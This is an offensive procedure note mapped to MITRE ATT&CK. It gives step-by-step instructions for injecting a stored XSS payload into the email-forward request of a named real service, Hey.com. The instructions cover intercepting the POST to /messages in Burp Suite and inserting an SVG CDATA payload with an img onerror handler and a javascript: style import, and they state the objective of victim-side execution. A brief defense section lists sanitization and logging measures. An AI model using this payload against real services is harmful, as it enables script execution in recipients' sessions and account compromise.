---
id: proc-uuid-002
tags:
  - xss
  - payload-injection
  - sanitizer-bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.600Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Inject XSS Payload in Email Forward

## Summary

This procedure intercepts the email forwarding POST request to /messages and injects a malicious HTML/JavaScript payload into the message[content] parameter, exploiting insufficient sanitization to store XSS for later execution.

## Description

Hey.com's forwarding feature processes multipart/form-data POSTs to /messages without fully escaping SVG CDATA sections, allowing injection of tags like <img onerror> or <style> within CDATA. The payload is stored server-side and rendered unsanitized when viewed. Prerequisites include authenticated sender session and Burp Suite proxy setup. Outcome: Payload stored, ready for triggering.

## Requirements

1. Authenticated sender account
2. Burp Suite configured as proxy for browser
3. Basic knowledge of HTTP request modification

## Defense

Defensive measures and detection strategies:

- Implement strict HTML sanitizers like DOMPurify that escape CDATA in SVG
- Validate and strip suspicious tags in email content
- Log and alert on anomalous POST payloads to /messages

## Objectives

1. Bypass HTML sanitization for stored XSS
2. Store executable JavaScript in email content
3. Prepare for victim-side execution

## Instructions

### Step 1: Initiate Forward

**Context**: Start the forwarding process to generate the interceptable request.

Log in to sender account, select an email, and choose forward to receiver account. Allow the request to hit Burp.

### Step 2: Modify Payload

**Context**: Inject the XSS payload into the content parameter.

In Burp Repeater, edit the POST body:

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="message[content]"

<svg><script><![CDATA[<img src=x onerror=alert(document.domain)> <style>@import'javascript:alert(1)';</style>]]></script></svg>

------WebKitFormBoundary--

Forward the request.

**Expected Output**: 200 OK response, email forwarded.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- payload-injection
- sanitizer-bypass
